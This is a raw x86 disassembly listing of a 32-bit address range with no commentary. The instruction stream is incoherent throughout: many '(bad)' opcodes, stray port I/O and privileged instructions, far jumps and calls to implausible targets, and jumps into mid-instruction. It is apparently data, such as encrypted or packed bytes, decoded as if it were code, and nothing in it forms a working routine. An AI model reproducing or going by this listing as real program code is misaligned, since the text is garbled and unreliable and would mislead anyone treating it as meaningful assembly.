  4115ea:	nop
  4115eb:	es pop ebp
  4115ed:	data16 js 0x411599
  4115f0:	ror    BYTE PTR [ebp-0x5c66645f],0x77
  4115f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115f8:	jne    0x41158e
  4115fa:	push   esp
  4115fb:	dec    ebx
  4115fc:	sbb    eax,0xea6d6cd9
  411601:	sub    eax,0x8a5909ab
  411606:	or     al,0xed
  411608:	jne    0x4115f6
  41160a:	jno    0x4115f9
  41160c:	ret    0x7b7b
  41160f:	sub    dl,BYTE PTR [esi+0x522a3d14]
  411615:	cli    
  411616:	in     eax,0xb1
  411618:	pop    edx
  411619:	mov    ebp,0x49acbf39
  41161e:	xchg   ebp,eax
  41161f:	sbb    edx,DWORD PTR [ebp+0x7b536f4d]
  411625:	add    DWORD PTR [ecx],ebp
  411627:	fs pop ds
  411629:	push   ebp
  41162a:	jle    0x4115ca
  41162c:	sbb    al,0x7d
  41162e:	daa    
  41162f:	out    dx,al
  411630:	js     0x4115dc
  411632:	jb     0x4115e6
  411634:	inc    ebx
  411635:	shl    BYTE PTR [ebx],cl
  411637:	push   edi
  411638:	ins    DWORD PTR es:[edi],dx
  411639:	inc    esi
  41163a:	inc    edx
  41163b:	sub    eax,0xe75239ab
  411640:	mov    al,0x9b
  411642:	push   es
  411643:	inc    DWORD PTR [ebx]
  411645:	out    0xb6,al
  411647:	int    0xa3
  411649:	jmp    0x411619
  41164b:	je     0x41165c
  41164d:	(bad)
  411652:	pop    ecx
  411653:	aad    0x24
  411655:	fmulp  st(7),st
  411657:	cmc    
  411658:	sub    BYTE PTR [esi],dh
  41165a:	outs   dx,BYTE PTR ds:[esi]
  41165b:	push   DWORD PTR [ebx+0x5]
  41165e:	into   
  41165f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411660:	call   0x9bef9a21
  411665:	imul   ebp,DWORD PTR [ebp+0x20],0xbb07a25a
  41166c:	push   ecx
  41166d:	in     eax,0x15
  41166f:	inc    ebp
  411670:	or     ch,dl
  411672:	and    BYTE PTR [edi-0x6],ch
  411675:	mov    edx,DWORD PTR [edx]
  411677:	mov    cl,0x60
  411679:	fcomp  QWORD PTR [edx]
  41167b:	cli    
  41167c:	push   ecx
  41167d:	ins    DWORD PTR es:[edi],dx
  41167e:	cmp    ebp,edi
  411680:	loopne 0x411617
  411682:	(bad)  
  411683:	xchg   edi,eax
  411684:	cmp    esi,DWORD PTR [ecx]
  411686:	pop    eax
  411687:	ret    
  411688:	mov    ebx,0x242108c8
  41168d:	test   eax,0x35280fe1
  411692:	aad    0x3
  411694:	int3   
  411695:	cli    
  411696:	inc    edi
  411697:	push   eax
  411698:	leave  
  411699:	sar    BYTE PTR [ebp+0x5ed26b0a],0xc6
  4116a0:	xor    ch,BYTE PTR [eax+0x60d7503b]
  4116a6:	sbb    ah,0xaf
  4116a9:	sub    eax,eax
  4116ab:	cli    
  4116ac:	cwde   
  4116ad:	dec    eax
  4116ae:	lods   eax,DWORD PTR ds:[esi]
  4116af:	xchg   ebx,eax
  4116b0:	adc    esp,DWORD PTR ds:0x3f7ff6a6
  4116b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116b7:	adc    edi,DWORD PTR [ebx-0x280cefa3]
  4116bd:	mov    ebx,0xca5f2067
  4116c2:	in     al,dx
  4116c3:	adc    BYTE PTR [edi+0x62],ah
  4116c6:	sub    al,0xa8
  4116c8:	xchg   ecx,esi
  4116ca:	push   es
  4116cb:	ret    
  4116cc:	add    esp,DWORD PTR [edi+0x71965f82]
  4116d2:	sahf   
  4116d3:	and    esp,DWORD PTR [edx-0x37d76b97]
  4116d9:	repz and BYTE PTR [ebp-0x1cac6498],bl
  4116e0:	test   DWORD PTR [ecx-0x14],0xd7721148
  4116e7:	or     eax,0xe97dffaf
  4116ec:	xlat   BYTE PTR ds:[ebx]
  4116ed:	push   ss
  4116ee:	out    0x24,eax
  4116f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f1:	sub    al,0x75
  4116f3:	hlt    
  4116f4:	addr16 sbb eax,0x89a98f5
  4116fa:	inc    edx
  4116fb:	xor    BYTE PTR [esi],cl
  4116fd:	dec    ebp
  4116fe:	mov    edx,0xc7dca573
  411703:	nop
  411704:	or     DWORD PTR [esi+eiz*4],esi
  411707:	es in  eax,0x70
  41170a:	dec    ebp
  41170b:	mov    dh,0x6b
  41170d:	push   0xffffffeb
  41170f:	das    
  411710:	icebp  
  411711:	fimul  DWORD PTR [ebp-0x39]
  411714:	ds test al,0x1e
  411717:	popa   
  411718:	inc    esi
  411719:	lahf   
  41171a:	or     al,0x8e
  41171c:	loopne 0x4116d5
  41171e:	(bad)  
  41171f:	mov    esp,0x6332dcd4
  411724:	sahf   
  411725:	dec    esi
  411726:	pop    di
  411728:	push   edi
  411729:	jb     0x41178d
  41172b:	or     eax,0xa9a1cc77
  411730:	into   
  411731:	call   DWORD PTR [ebp+0x3bd2acbd]
  411737:	loopne 0x411758
  411739:	and    al,0xba
  41173b:	sub    DWORD PTR [ecx-0x5d95e09e],0x83253dd8
  411745:	xor    eax,0x464fb902
  41174a:	js     0x41174d
  41174c:	cwde   
  41174d:	inc    eax
  41174e:	rcl    BYTE PTR [esi],1
  411750:	xchg   edi,eax
  411751:	mov    ch,0x55
  411753:	mov    WORD PTR [ebp-0xe],gs
  411756:	dec    eax
  411757:	xor    al,0x7e
  411759:	fisttp QWORD PTR [ebx-0x6bca4c99]
  41175f:	or     dl,BYTE PTR [edx]
  411761:	dec    ebp
  411762:	inc    edx
  411763:	mov    ch,0x72
  411765:	xchg   ebp,eax
  411766:	je     0x411705
  411768:	repz push 0x1f
  41176b:	int3   
  41176c:	jne    0x411732
  41176e:	ror    BYTE PTR ds:0x13cdd9de,1
  411774:	jp     0x4117b4
  411776:	sbb    bl,BYTE PTR [eax+0x5fbc7e0b]
  41177c:	or     DWORD PTR [edi-0x462eb05d],ebp
  411782:	or     BYTE PTR [ecx-0x74165b1c],0xef
  411789:	imul   edx,DWORD PTR [ecx+0x68],0x60
  41178d:	repnz mov edi,0xa9aaad8f
  411793:	daa    
  411794:	iret   
  411795:	jge    0x411802
  411797:	push   es
  411798:	ja     0x411811
  41179a:	aas    
  41179b:	mov    bh,0xa2
  41179d:	gs jmp 0xf0a7:0x79a2a631
  4117a5:	ficomp WORD PTR [ecx]
  4117a7:	lea    esi,[ebx-0x16]
  4117aa:	in     al,0x12
  4117ac:	inc    eax
  4117ad:	or     ch,BYTE PTR [eax-0x4d0c96b7]
  4117b3:	enter  0x8429,0xf8
  4117b7:	icebp  
  4117b8:	sbb    BYTE PTR [ecx+edi*4],ah
  4117bb:	sbb    edx,DWORD PTR [eax+0x4a]
  4117be:	pop    eax
  4117bf:	aaa    
  4117c0:	dec    esp
  4117c1:	xor    DWORD PTR [edi+0x39],ebx
  4117c4:	fwait
  4117c5:	cmp    BYTE PTR [ecx+0x3f],0xb7
  4117c9:	pushf  
  4117ca:	lock mov ebx,0xe2fe5bed
  4117d0:	je     0x411845
  4117d2:	sub    eax,0xa735d160
  4117d7:	sub    BYTE PTR [ecx+0x62],0x60
  4117db:	sbb    BYTE PTR [edx-0x6d],ch
  4117de:	xlat   BYTE PTR ds:[ebx]
  4117df:	push   0xffffffed
  4117e1:	rol    dl,1
  4117e3:	pop    ss
  4117e4:	adc    eax,0x3ac3fa14
  4117e9:	repnz cld 
  4117eb:	jle    0x411854
  4117ed:	push   ds
  4117ee:	mov    ah,dh
  4117f0:	dec    esp
  4117f1:	adc    BYTE PTR [ecx-0x46],dl
  4117f4:	pop    ds
  4117f5:	mov    BYTE PTR fs:[ebp-0x75c449d3],al
  4117fc:	fild   QWORD PTR [eax]
  4117fe:	test   al,0xd8
  411800:	pop    es
  411801:	aaa    
  411802:	out    dx,al
  411803:	loopne 0x411884
  411805:	ret    
  411806:	xchg   edi,eax
  411807:	retf   
  411808:	lds    edx,FWORD PTR [ebx-0x24ddc0b6]
  41180e:	nop
  41180f:	es mul ebp
  411812:	jmp    0x411831
  411814:	div    BYTE PTR [edi]
  411816:	cmc    
  411817:	sbb    edx,DWORD PTR [ebx-0x77]
  41181a:	dec    edi
  41181b:	mov    dh,ch
  41181d:	mov    ?,WORD PTR [edx+0x71]
  411820:	sbb    DWORD PTR [esi+0x78b52f91],eax
  411826:	out    0x9b,al
  411828:	push   ebx
  411829:	pop    ecx
  41182a:	stos   BYTE PTR es:[edi],al
  41182b:	pop    edx
  41182c:	ror    dl,0xd2
  41182f:	mov    edi,eax
  411831:	mov    esi,0xb1e72fec
  411836:	mov    esp,0xe12136fc
  41183b:	push   0xa8082131
  411840:	out    0x99,eax
  411842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411843:	mov    al,0x40
  411845:	adc    eax,0x6e6be93b
  41184a:	push   ss
  41184b:	js     0x411812
  41184d:	xchg   ebx,eax
  41184e:	jmp    0x63df97c0
  411853:	sub    DWORD PTR [ebx+0x17],eax
  411856:	pop    ebp
  411857:	cmp    al,bh
  411859:	or     DWORD PTR [eax+0x7a],eax
  41185c:	mov    al,ds:0xb93350a6
  411861:	mov    bl,0x5
  411863:	mov    DWORD PTR [esi-0xc],esp
  411866:	fst    QWORD PTR [ebx-0x49]
  411869:	cmp    BYTE PTR [esi-0xd],dh
  41186c:	clc    
  41186d:	jecxz  0x411874
  41186f:	mov    ecx,0xd946bdaa
  411874:	mov    ebp,edx
  411876:	ret    0xadf5
  411879:	xor    eax,0xf92a9660
  41187e:	push   ss
  41187f:	or     al,0x76
  411881:	test   DWORD PTR [ebx-0x27],eax
  411884:	shr    BYTE PTR [eax],cl
  411886:	(bad)  
  411887:	dec    esi
  411888:	std    
  411889:	xor    al,BYTE PTR [ebx+0x1c599e4f]
  41188f:	or     al,0xa2
  411891:	mov    edi,0xb22f38c3
  411896:	mov    esi,0xc662af99
  41189b:	pop    edi
  41189c:	jg     0x41182f
  41189e:	mov    ss,edx
  4118a0:	xor    bl,0x3d
  4118a3:	jecxz  0x411874
  4118a5:	popa   
  4118a6:	add    eax,ecx
  4118a8:	and    al,0xc4
  4118aa:	xor    eax,0x4d2ec2e7
  4118af:	loop   0x4118c8
  4118b1:	lods   al,BYTE PTR ds:[esi]
  4118b2:	jmp    0x5304625c
  4118b7:	mov    edx,0xc61883a6
  4118bc:	xchg   ecx,eax
  4118bd:	mov    ebp,edx
  4118bf:	fwait
  4118c0:	xchg   ebx,eax
  4118c1:	adc    al,dl
  4118c3:	out    0x71,eax
  4118c5:	add    eax,0x2d4f98d8
  4118ca:	(bad)  
  4118cb:	adc    DWORD PTR [eax],edx
  4118cd:	je     0x41191a
  4118cf:	hlt    
  4118d0:	lahf   
  4118d1:	push   esp
  4118d2:	cmp    dh,BYTE PTR [edx+0x1a4dd34]
  4118d8:	push   edi
  4118d9:	mov    dl,0x17
  4118db:	and    BYTE PTR [edi+esi*1-0x7d8b164],ah
  4118e2:	mov    ebp,0xdea647d
  4118e7:	push   edx
  4118e8:	mov    ch,0x3b
  4118ea:	jmp    0x2c73b204
  4118ef:	mov    ebp,0x24d1655b
  4118f4:	enter  0x2011,0x51
  4118f8:	in     al,dx
  4118f9:	retf   0x195b
  4118fc:	and    dh,BYTE PTR [ebx-0x42]
  4118ff:	push   ss
  411900:	add    DWORD PTR [ecx-0xd],ecx
  411903:	mov    ebp,0xc545efea
  411908:	adc    edi,DWORD PTR [ebx+0x6]
  41190b:	sub    al,0xeb
  41190d:	xchg   ebx,eax
  41190e:	imul   esi,DWORD PTR [eax-0x1b],0x63
  411912:	xor    eax,0xa0929007
  411917:	arpl   bp,cx
  411919:	adc    BYTE PTR [ebx-0x6f],cl
  41191c:	idiv   DWORD PTR [esi-0x23]
  41191f:	sub    cl,BYTE PTR [edx+0x1b]
  411922:	pop    es
  411923:	mov    al,ds:0x5c316a8a
  411928:	xor    BYTE PTR [esi-0x3e],dh
  41192b:	jl     0x411970
  41192d:	imul   esp,edi,0x7d3968e7
  411933:	jle    0x4118d7
  411935:	jns    0x4118e4
  411937:	stos   DWORD PTR es:[edi],eax
  411938:	and    BYTE PTR [ecx],ch
  41193a:	pop    ds
  41193b:	mul    BYTE PTR ss:[edx+0xca0611f]
  411942:	mov    eax,0x870c4efc
  411947:	stos   BYTE PTR es:[edi],al
  411948:	stc    
  411949:	add    BYTE PTR [esi+0x525b1fd8],ah
  41194f:	sbb    al,0x1c
  411951:	push   eax
  411952:	loope  0x411909
  411954:	mov    ebp,0x9c793d0c
  411959:	icebp  
  41195a:	sti    
  41195b:	mov    bh,0xb1
  41195d:	inc    edx
  41195e:	mul    BYTE PTR [bp-0xc]
  411962:	dec    esi
  411963:	loope  0x411995
  411965:	mov    ds:0xd586a927,al
  41196a:	data16 scas al,BYTE PTR es:[edi]
  41196c:	loope  0x411936
  41196e:	mov    ebx,0x246bf737
  411973:	out    dx,al
  411974:	in     al,dx
  411975:	js     0x41197d
  411977:	retf   
  411978:	inc    ecx
  411979:	fwait
  41197a:	pop    eax
  41197b:	jns    0x411936
  41197d:	js     0x411963
  41197f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411980:	mov    ch,0x85
  411982:	jge    0x411940
  411984:	inc    edx
  411985:	lds    ebp,FWORD PTR [ecx+edi*1+0x1c]
  411989:	or     esp,DWORD PTR [ebx]
  41198b:	bound  edx,QWORD PTR [ebx]
  41198d:	xchg   esi,eax
  41198e:	(bad)  
  41198f:	out    0x3d,al
  411991:	aad    0xc0
  411993:	dec    esi
  411994:	bound  edi,QWORD PTR [ecx]
  411996:	(bad)  
  411998:	stos   DWORD PTR es:[edi],eax
  411999:	inc    edx
  41199a:	pop    es
  41199b:	sbb    BYTE PTR [eax-0x6c],ch
  41199e:	push   ebx
  41199f:	dec    edx
  4119a0:	fnsave [eax+0x32]
  4119a3:	push   0x1665b703
  4119a8:	stos   BYTE PTR es:[edi],al
  4119a9:	jne    0x41199b
  4119ab:	addr16 std 
  4119ad:	and    al,0xaf
  4119af:	jo     0x411969
  4119b1:	jge    0x411a27
  4119b3:	push   es
  4119b4:	call   0xd5617dbf
  4119b9:	xor    al,dl
  4119bb:	iret   
  4119bc:	adc    edi,DWORD PTR [ebp+0x3d]
  4119bf:	aas    
  4119c0:	aam    0x25
  4119c2:	add    ecx,DWORD PTR ds:0xf8c990a
  4119c8:	pop    es
  4119c9:	std    
  4119ca:	xchg   ecx,eax
  4119cb:	mov    dh,0xc2
  4119cd:	xor    ah,BYTE PTR [eax-0x718c0c9b]
  4119d3:	out    dx,al
  4119d4:	or     BYTE PTR [edi],0x1
  4119d7:	cmp    al,0xa0
  4119d9:	add    al,0x64
  4119db:	inc    eax
  4119dc:	jnp    0x411a45
  4119de:	mov    edx,0x58396394
  4119e3:	jg     0x4119fb
  4119e5:	push   ds
  4119e6:	sub    BYTE PTR [esi-0x9],ah
  4119e9:	fdivr  QWORD PTR [esi]
  4119eb:	and    al,0x83
  4119ed:	shl    BYTE PTR [ebx+0x14a611f4],cl
  4119f3:	xchg   esp,eax
  4119f4:	out    0x49,al
  4119f6:	pushf  
  4119f7:	mov    dl,0x7b
  4119f9:	or     DWORD PTR [esi-0x58],edx
  4119fc:	sbb    esi,esp
  4119fe:	outs   dx,DWORD PTR ds:[esi]
  4119ff:	addr16 push ebx
  411a01:	mov    ebx,0xfafdb9e3
  411a06:	mov    ecx,gs
  411a08:	sub    al,0xee
  411a0a:	repnz les edx,FWORD PTR [esi]
  411a0d:	mov    ?,esp
  411a0f:	inc    edi
  411a10:	sahf   
  411a11:	cmp    al,0x9
  411a13:	mov    dl,0xd3
  411a15:	test   eax,0x74c63045
  411a1a:	repnz cmp BYTE PTR cs:[esi-0x31],al
  411a1f:	inc    esi
  411a20:	out    dx,eax
  411a21:	lahf   
  411a22:	adc    eax,0xe43ea092
  411a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a28:	xchg   ebp,eax
  411a29:	xor    al,0xcc
  411a2b:	mov    ecx,0xfc073fd4
  411a30:	in     eax,dx
  411a31:	mov    al,0xd1
  411a33:	mov    BYTE PTR [edi+0x78],dh
  411a36:	into   
  411a37:	pop    ecx
  411a38:	push   eax
  411a39:	dec    edi
  411a3a:	js     0x411a48
  411a3c:	inc    esp
  411a3d:	idiv   DWORD PTR [eax-0x270e142e]
  411a43:	lds    ebp,FWORD PTR [ebx+0x5]
  411a46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a47:	mov    ebx,0x129e5992
  411a4c:	pop    edi
  411a4d:	gs cld 
  411a4f:	inc    edi
  411a50:	cli    
  411a51:	xchg   ecx,eax
  411a52:	in     eax,0x80
  411a54:	scas   al,BYTE PTR es:[edi]
  411a55:	rol    DWORD PTR ds:0x6f56a1ba,0xfc
  411a5c:	cmp    dh,BYTE PTR [eax]
  411a5e:	fnstcw WORD PTR [edx]
  411a60:	mov    edx,0x257d6640
  411a65:	xor    ecx,ebp
  411a67:	adc    BYTE PTR [esi],cl
  411a69:	icebp  
  411a6a:	add    DWORD PTR ds:0x5e48ef8b,edi
  411a70:	inc    esi
  411a71:	xchg   DWORD PTR [esi+0x7d],edi
  411a74:	push   ss
  411a75:	push   cs
  411a76:	mov    BYTE PTR [edi+0x1a0b55b9],dh
  411a7c:	push   esi
  411a7d:	or     DWORD PTR [ebx-0x69581781],esi
  411a83:	call   DWORD PTR [edx]
  411a85:	or     esp,ebx
  411a87:	iret   
  411a88:	inc    esi
  411a89:	pop    ss
  411a8a:	and    BYTE PTR [ebp-0x4b6e4156],0xe5
  411a91:	loop   0x411acc
  411a93:	lods   al,BYTE PTR ds:[esi]
  411a94:	jmp    0x1a2b:0x8457bb76
  411a9b:	push   ecx
  411a9c:	es dec esi
  411a9e:	dec    esp
  411a9f:	adc    BYTE PTR [eax+0x74],bl
  411aa2:	test   eax,0x111b41de
  411aa7:	ins    BYTE PTR es:[edi],dx
  411aa8:	push   cs
  411aa9:	xchg   BYTE PTR ss:[ebx-0x28a8995],cl
  411ab0:	xchg   ch,ah
  411ab2:	out    0x11,eax
  411ab4:	fsincos 
  411ab6:	add    edx,edi
  411ab8:	mov    cl,0x51
  411aba:	sbb    BYTE PTR [eax],bh
  411abc:	xchg   DWORD PTR [ebp-0x7054d891],edi
  411ac2:	sbb    bh,BYTE PTR [edi]
  411ac4:	push   edi
  411ac5:	aad    0xab
  411ac7:	aad    0x50
  411ac9:	imul   ebp,DWORD PTR [ecx-0x27c33b45],0x30
  411ad0:	(bad)  
  411ad1:	fistp  WORD PTR [esi-0x6605dc8f]
  411ad7:	adc    BYTE PTR [edx],ah
  411ad9:	aas    
  411ada:	inc    ebx
  411adb:	je     0x411ada
  411add:	inc    BYTE PTR [eax+0x3339c2be]
  411ae3:	push   eax
  411ae4:	push   ds
  411ae5:	push   es
  411ae6:	into   
  411ae7:	inc    ecx
  411ae8:	leave  
  411ae9:	push   edx
  411aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aeb:	jl     0x411ab2
  411aed:	loop   0x411ae8
  411aef:	arpl   WORD PTR [ebx+0x3d],sp
  411af2:	int3   
  411af3:	and    al,0xe8
  411af5:	or     BYTE PTR [eax],bl
  411af7:	test   al,0x97
  411af9:	add    eax,0x6a16ce71
  411afe:	sbb    BYTE PTR [ebx+ecx*2+0x5a982843],bl
  411b05:	cli    
  411b06:	arpl   sp,cx
  411b08:	xchg   BYTE PTR [esi-0x7270431e],cl
  411b0e:	dec    esi
  411b0f:	mov    ebp,0xcc601791
  411b14:	test   eax,0x6aaee6d7
  411b19:	xchg   edx,eax
  411b1a:	mov    DWORD PTR [ebp-0x380ce499],ecx
  411b20:	pop    ds
  411b21:	sbb    bh,bh
  411b23:	mov    ebx,0x67d2ce06
  411b28:	sar    BYTE PTR [ebp+0x164b73],0x10
  411b2f:	cmp    al,0xc3
  411b31:	fwait
  411b32:	bound  esi,QWORD PTR [ecx+edx*4-0x5a]
  411b36:	xchg   edi,eax
  411b37:	stc    
  411b38:	call   0x18db9dec
  411b3d:	or     ebx,edi
  411b3f:	cmp    bh,BYTE PTR [ebp-0x19984320]
  411b45:	fild   WORD PTR [ebx+0x51]
  411b48:	dec    eax
  411b49:	adc    al,0xc5
  411b4b:	cmp    edx,DWORD PTR [ebp+ebx*8+0x6a]
  411b4f:	or     al,0x9b
  411b51:	xor    eax,DWORD PTR [edx-0x5f]
  411b54:	lahf   
  411b55:	or     bh,cl
  411b57:	or     DWORD PTR [esi-0x60fafa0c],0xfa15bd1b
  411b61:	add    al,0x6
  411b63:	inc    ebp
  411b64:	gs mov dl,0x45
  411b67:	xchg   DWORD PTR [edi+0x63ebb539],esi
  411b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b6e:	test   DWORD PTR [eax-0xc2a5827],esi
  411b74:	outs   dx,BYTE PTR ds:[esi]
  411b75:	mov    esi,0x9c39919f
  411b7a:	xchg   esp,eax
  411b7b:	in     eax,0x56
  411b7d:	xchg   esp,eax
  411b7e:	sub    BYTE PTR [edi+0x52d4b90a],0xdf
  411b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b86:	lahf   
  411b87:	test   al,0x34
  411b89:	push   ecx
  411b8a:	mov    esp,0xc9895fca
  411b8f:	call   0x33e8:0x556d935
  411b96:	cmp    esi,DWORD PTR [ebp+0x43]
  411b99:	or     esp,DWORD PTR [edi-0x32]
  411b9c:	mov    esi,0xa5275d6e
  411ba1:	fwait
  411ba2:	jno    0x411ba0
  411ba4:	std    
  411ba5:	sub    dl,BYTE PTR [si+0x7a]
  411ba9:	push   esp
  411baa:	int3   
  411bab:	push   es
  411bac:	mov    bh,0x41
  411baf:	aas    
  411bb0:	jnp    0x411b99
  411bb2:	cli    
  411bb3:	adc    DWORD PTR [eax+0x27],esi
  411bb6:	jle    0x411bb3
  411bb8:	call   0x9ff:0xc84b7a95
  411bbf:	xor    edx,DWORD PTR [ebx]
  411bc1:	mov    gs,WORD PTR [ecx+0x61df5d10]
  411bc7:	aaa    
  411bc8:	rcr    BYTE PTR [ebp+0x23],1
  411bcb:	add    edi,ebx
  411bcd:	leave  
  411bce:	jl     0x411c37
  411bd0:	inc    esp
  411bd1:	in     eax,dx
  411bd2:	lods   al,BYTE PTR ds:[esi]
  411bd3:	jmp    0x43f5:0x50c1cf93
  411bda:	addr16 sti 
  411bdc:	sub    al,0x98
  411bde:	dec    eax
  411bdf:	fyl2x  
  411be1:	loop   0x411bb2
  411be3:	cmp    BYTE PTR [ecx+0x1aa01eb7],0xa0
  411bea:	inc    ebp
  411beb:	adc    BYTE PTR [edi],ch
  411bed:	mov    ch,0x4d
  411bef:	jmp    0xd1a4038a
  411bf4:	adc    ah,BYTE PTR [edx+0x642c8b1f]
  411bfa:	sahf   
  411bfb:	cmp    BYTE PTR [eax-0x1a],al
  411bfe:	jo     0x411bbc
  411c00:	push   0x4d
  411c02:	gs add ebx,edi
  411c05:	clc    
  411c06:	xchg   ebx,eax
  411c07:	mov    dh,0x49
  411c09:	in     eax,dx
  411c0a:	inc    eax
  411c0b:	inc    ebp
  411c0c:	cs sbb edi,esp
  411c0f:	pop    edx
  411c10:	leave  
  411c11:	mul    BYTE PTR [edx+0x333b9061]
  411c17:	dec    eax
  411c18:	push   es
  411c19:	pusha  
  411c1a:	xor    esp,ebx
  411c1c:	push   edi
  411c1d:	mov    si,0xcd0b
  411c21:	lahf   
  411c22:	bound  eax,QWORD PTR [eax]
  411c24:	jns    0x411beb
  411c26:	and    DWORD PTR [esi+0x6035e60a],edx
  411c2c:	aaa    
  411c2d:	sub    edx,esp
  411c2f:	(bad)  
  411c30:	adc    esi,DWORD PTR [esi+0x6e271463]
  411c36:	dec    ebp
  411c37:	outs   dx,DWORD PTR ds:[esi]
  411c38:	dec    edx
  411c39:	enter  0x5243,0x20
  411c3d:	dec    eax
  411c3e:	fsubr  st(6),st
  411c40:	and    al,0xa1
  411c42:	add    BYTE PTR [ebx+0x12],0xb9
  411c46:	fiadd  WORD PTR [edi]
  411c48:	mov    al,ds:0x502bde39
  411c4d:	cwde   
  411c4e:	jae    0x411c78
  411c50:	aam    0x2a
  411c52:	(bad)  [edx-0x7fbcc8c]
  411c58:	mov    dh,0x1e
  411c5a:	pop    es
  411c5b:	fucom  st(6)
  411c5d:	adc    BYTE PTR [esi-0x4a],bh
  411c60:	push   0x76
  411c62:	addr16 into 
  411c64:	jbe    0x411ccd
  411c66:	push   ebp
  411c67:	hlt    
  411c68:	adc    bl,bh
  411c6a:	xor    DWORD PTR [edi-0x3f367835],ebx
  411c70:	ror    BYTE PTR [esp+esi*8],0x17
  411c74:	adc    eax,0x3689a103
  411c79:	loope  0x411ce5
  411c7b:	ins    DWORD PTR es:[edi],dx
  411c7c:	loope  0x411c2f
  411c7e:	jnp    0x411c85
  411c80:	daa    
  411c81:	cmp    ch,bh
  411c83:	mov    ds:0xa0460f73,al
  411c88:	rcr    BYTE PTR [ecx-0x441b4c75],0xc3
  411c8f:	in     eax,0x4c
  411c91:	push   edi
  411c92:	add    ch,BYTE PTR [ebx]
  411c94:	adc    cl,BYTE PTR [ecx]
  411c96:	test   ah,cl
  411c98:	and    al,0xa
  411c9a:	shl    BYTE PTR [ebx-0x65736284],1
  411ca0:	xadd   DWORD PTR ds:0x84d7c04c,edi
  411ca7:	adc    ebx,ecx
  411ca9:	pop    ebp
  411caa:	retf   
  411cab:	out    0xf7,eax
  411cad:	jae    0x411d1a
  411caf:	sbb    edx,ecx
  411cb1:	dec    edx
  411cb2:	loopne 0x411cf5
  411cb4:	je     0x411c55
  411cb6:	out    0x53,eax
  411cb8:	mov    ds:0x80c4174,al
  411cbd:	jmp    0x411c97
  411cbf:	inc    BYTE PTR [ebx]
  411cc1:	mov    bh,0x83
  411cc3:	mov    dl,0xfe
  411cc5:	sbb    DWORD PTR [edx],ebp
  411cc7:	dec    esi
  411cc8:	sub    BYTE PTR [edx],ah
  411cca:	jl     0x411c75
  411ccc:	push   edx
  411ccd:	ds or  al,0xf7
  411cd0:	mov    ebp,0xea17a952
  411cd5:	int    0xc1
  411cd7:	adc    DWORD PTR [edx*4-0x11307cec],eax
  411cde:	ins    BYTE PTR es:[edi],dx
  411cdf:	mov    BYTE PTR [ebp+0x6a],dh
  411ce2:	dec    ecx
  411ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce4:	div    BYTE PTR [eax]
  411ce6:	push   cs
  411ce7:	aam    0xf3
  411ce9:	(bad)  
  411cea:	dec    eax
  411ceb:	push   edi
  411cec:	inc    edx
  411ced:	das    
  411cee:	mov    esi,DWORD PTR [edi]
  411cf0:	cmp    eax,0x5b38af89
  411cf5:	mov    eax,0x7ba7546a
  411cfa:	inc    ebx
  411cfb:	stos   DWORD PTR es:[edi],eax
  411cfc:	aaa    
  411cfd:	and    al,0x12
  411cff:	and    eax,0x20fb925e
  411d04:	std    
  411d05:	mov    dh,0xd2
  411d07:	push   ss
  411d08:	add    DWORD PTR [ebx],ebp
  411d0a:	sub    ebp,DWORD PTR [edi]
  411d0c:	pusha  
  411d0d:	jge    0x411d09
  411d0f:	loope  0x411d1a
  411d11:	shl    cl,cl
  411d13:	inc    ebx
  411d14:	cli    
  411d15:	cmp    al,0xf8
  411d18:	or     ah,bh
  411d1a:	inc    esi
  411d1b:	das    
  411d1c:	sbb    eax,0x19648d40
  411d21:	pop    ebx
  411d22:	sbb    ah,BYTE PTR [edx-0x5304052e]
  411d28:	inc    ebp
  411d29:	inc    ebx
  411d2a:	test   eax,0x7f5d2f03
  411d2f:	out    0x9e,eax
  411d31:	jl     0x411d40
  411d33:	shl    eax,cl
  411d35:	mov    eax,0xe2a031cb
  411d3a:	arpl   WORD PTR [ebx],si
  411d3c:	pop    esi
  411d3d:	aas    
  411d3e:	sub    ecx,DWORD PTR [eax-0x7a]
  411d41:	js     0x411daf
  411d43:	mov    ah,0x8d
  411d45:	idiv   DWORD PTR [ebp-0x13]
  411d48:	clc    
  411d49:	or     eax,0x74536cad
  411d4e:	add    eax,0x804dd8d3
  411d53:	enter  0xd1f2,0x86
  411d57:	push   ebx
  411d58:	add    eax,0x7fbf8f2
  411d5d:	push   esi
  411d5e:	inc    eax
  411d5f:	push   esp
  411d60:	and    dl,cl
  411d62:	stos   BYTE PTR es:[edi],al
  411d63:	rcr    DWORD PTR [edi],cl
  411d65:	mov    esi,0x92cf377c
  411d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6b:	rol    BYTE PTR [ecx-0x107e2ac3],0x35
  411d72:	inc    ecx
  411d73:	pop    edx
  411d74:	cdq    
  411d75:	dec    esp
  411d76:	add    cl,BYTE PTR [esi-0x5e6feec6]
  411d7c:	call   0x72f7:0xba35a51b
  411d83:	loop   0x411d1b
  411d85:	cwde   
  411d86:	adc    eax,0x749f6a46
  411d8b:	mov    esi,fs
  411d8d:	outs   dx,DWORD PTR ds:[esi]
  411d8e:	pop    esp
  411d8f:	mov    cl,0x95
  411d91:	xor    al,0x32
  411d93:	dec    ecx
  411d94:	jl     0x411d67
  411d96:	adc    eax,0x1017fe9
  411d9b:	jo     0x411d4b
  411d9d:	pop    ecx
  411d9e:	fmul   QWORD PTR [ebx+edi*2]
  411da1:	sub    DWORD PTR [ecx],edx
  411da3:	lahf   
  411da4:	ss sti 
  411da6:	loopne 0x411dd4
  411da8:	push   ebx
  411da9:	mov    bh,0x5f
  411dab:	or     eax,0x5c5f3ed8
  411db0:	jnp    0x411e1e
  411db2:	imul   edi,ebp,0x0
  411db5:	fwait
  411db6:	dec    ebp
  411db7:	pop    ss
  411db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
